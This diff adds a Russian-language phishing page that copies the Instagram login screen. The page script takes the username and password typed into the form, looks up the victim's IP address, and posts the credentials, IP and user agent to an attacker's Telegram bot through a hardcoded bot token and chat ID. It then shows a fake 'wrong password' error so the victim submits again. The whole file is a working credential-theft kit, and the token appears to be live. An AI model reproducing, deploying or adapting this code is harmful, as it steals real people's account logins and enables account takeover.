@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            line-height: 18px;
+            color: #262626;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* Основной контейнер */
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+
+        /* Карточка входа */
+        .login-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            margin-bottom: 10px;
+            padding: 30px 40px 30px;
+            text-align: center;
+        }
+
+        /* Логотип */
+        .logo {
+            margin-bottom: 30px;
+        }
+        .logo svg {
+            width: 175px;
+            height: 51px;
+        }
+
+        /* Поля ввода */
+        .input-group {
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 0 7px 8px;
+            font-size: 12px;
+            outline: none;
+            transition: border 0.1s ease;
+        }
+        .input-group input:focus {
+            border-color: #a8a8a8;
+        }
+
+        /* Кнопка входа */
+        .login-btn {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 14px;
+            line-height: 18px;
+            padding: 7px 16px;
+            width: 100%;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: background 0.1s ease;
+        }
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+        /* Стиль для неактивной кнопки */
+        .login-btn.disabled {
+            background-color: #b2dffc;
+            pointer-events: none;
+        }
+
+
+        /* Разделитель "ИЛИ" */
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .separator span {
+            margin: 0 18px;
+        }
+
+        /* Ссылка "Забыли пароль?" */
+        .forgot-password {
+            display: block;
+            color: #00376b;
+            font-size: 12px;
+            line-height: 16px;
+            margin-top: 12px;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* Блок регистрации */
+        .signup-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            text-align: center;
+        }
+        .signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .signup-card a:hover {
+            text-decoration: underline;
+        }
+
+        /* Блок "Установите приложение" */
+        .get-app {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .get-app p {
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        .stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        .stores img {
+            height: 40px;
+        }
+
+        /* Футер */
+        .footer {
+            margin-top: 60px;
+            padding: 0 16px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            line-height: 16px;
+        }
+        .footer-links {
+            margin-bottom: 16px;
+        }
+        .footer-links a, .footer-links span {
+            display: inline-block;
+            margin: 0 4px 8px;
+            text-decoration: none;
+            color: #8e8e8e;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .copyright {
+            text-transform: uppercase;
+        }
+
+        /* Сообщение об ошибке (скрыто по умолчанию) */
+        .error-message {
+            background-color: #ffebee;
+            color: #c62828;
+            font-size: 12px;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0 0;
+            text-align: left;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+    <img src="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" alt="Instagram" style="width: 175px; height: auto;">
+</div>
+
+            <form id="loginForm" action="#" method="post">
+                <div class="input-group">
+                    <input type="text" id="username" name="username" placeholder="Имя пользователя, эл. адрес или мобильный телефон..." autocomplete="off" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Пароль" required>
+                </div>
+                <button type="submit" class="login-btn" id="loginButton">Войти</button>
+                <div id="errorMessage" class="error-message"></div>
+                <div class="separator">
+                    <span>ИЛИ</span>
+                </div>
+                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password" target="_blank" rel="noopener noreferrer">Забыли пароль?</a>
+            </form>
+        </div>
+
+        <div class="signup-card">
+            У вас ещё нет аккаунта? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" rel="noopener noreferrer">Зарегистрироваться</a>.
+        </div>
+
+        <div class="get-app">
+            <p>Установите приложение.</p>
+            <div class="stores">
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank" rel="noopener noreferrer">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
+                </a>
+                <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank" rel="noopener noreferrer">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store">
+                </a>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="https://about.instagram.com/" target="_blank" rel="noopener noreferrer">Meta</a>
+                <span>·</span>
+                <a href="https://about.instagram.com/" target="_blank" rel="noopener noreferrer">Информация</a>
+                <span>·</span>
+                <a href="https://about.instagram.com/blog/" target="_blank" rel="noopener noreferrer">Блог</a>
+                <span>·</span>
+                <a href="https://about.instagram.com/jobs/" target="_blank" rel="noopener noreferrer">Вакансии</a>
+                <span>·</span>
+                <a href="https://help.instagram.com/" target="_blank" rel="noopener noreferrer">Помощь</a>
+                <span>·</span>
+                <a href="https://developers.facebook.com/products/instagram/" target="_blank" rel="noopener noreferrer">API</a>
+                <span>·</span>
+                <a href="https://www.instagram.com/legal/privacy/" target="_blank" rel="noopener noreferrer">Конфиденциальность</a>
+                <span>·</span>
+                <a href="https://www.instagram.com/legal/terms/" target="_blank" rel="noopener noreferrer">Условия</a>
+                <span>·</span>
+                <a href="https://www.instagram.com/explore/locations/" target="_blank" rel="noopener noreferrer">Места</a>
+                <span>·</span>
+                <a href="https://www.instagram.com/web/lite/" target="_blank" rel="noopener noreferrer">Instagram Lite</a>
+                <span>·</span>
+                <a href="https://www.threads.com/" target="_blank" rel="noopener noreferrer">Threads</a>
+            </div>
+            <div class="copyright">
+                © 2026 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // --- НАСТРОЙКИ ТЕЛЕГРАМ (ЗАМЕНИТЕ НА ВАШИ ДАННЫЕ) ---
+            const TELEGRAM_BOT_TOKEN = '8556077270:AAFv7RAI-8bnGKxiqFNg-OEt0bbUj-aGBz0'; // Вставьте ваш токен
+            const TELEGRAM_CHAT_ID = '7535826075'; // Вставьте ваш Chat ID
+            // -----------------------------------------------------
+
+            const loginForm = document.getElementById('loginForm');
+            const loginButton = document.getElementById('loginButton');
+            const errorMessageDiv = document.getElementById('errorMessage');
+
+            function showError(text) {
+                errorMessageDiv.style.display = 'block';
+                errorMessageDiv.innerText = text;
+                setTimeout(() => {
+                    errorMessageDiv.style.display = 'none';
+                }, 3000);
+            }
+
+            async function sendToTelegram(username, password) {
+                if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                    console.error('Telegram bot token is not set!');
+                    return false;
+                }
+                if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                    console.error('Telegram chat ID is not set!');
+                    return false;
+                }
+
+                const userIP = await getUserIP();
+                const userAgent = navigator.userAgent;
+                const currentDate = new Date();
+                const dateTime = currentDate.toLocaleString();
+
+                const message = `🔐 Instagram Login Captured 🔐\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n🌐 *IP Address:* ${userIP}\n🕒 *Date/Time:* ${dateTime}\n📱 *User Agent:* ${userAgent}\n📍 *ISP Location:* ${userIP}`;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    if (response.ok) {
+                        console.log('Credentials sent to Telegram successfully.');
+                        return true;
+                    } else {
+                        console.error('Failed to send to Telegram:', response.status);
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error sending to Telegram:', error);
+                    return false;
+                }
+            }
+
+            function getUserIP() {
+                return new Promise((resolve) => {
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => resolve(data.ip))
+                        .catch(() => resolve('Не удалось определить'));
+                });
+            }
+
+            loginForm.addEventListener('submit', async function(event) {
+                event.preventDefault();
+
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value;
+
+                if (!username || !password) {
+                    showError('Пожалуйста, заполните оба поля.');
+                    return;
+                }
+
+                loginButton.classList.add('disabled');
+                loginButton.innerText = 'Вход...';
+
+                try {
+                    const sent = await sendToTelegram(username, password);
+                    
+                    if (!sent) {
+                        console.warn('Failed to send to Telegram, but proceeding with error simulation.');
+                    }
+                    
+                    setTimeout(() => {
+                        showError('Извините, неверный пароль. Пожалуйста, попробуйте еще раз.');
+                        document.getElementById('password').value = '';
+                        loginButton.classList.remove('disabled');
+                        loginButton.innerText = 'Войти';
+                    }, 500);
+                } catch (error) {
+                    console.error('Unexpected error during form submission:', error);
+                    loginButton.classList.remove('disabled');
+                    loginButton.innerText = 'Войти';
+                    showError('Произошла техническая ошибка. Пожалуйста, попробуйте позже.');
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
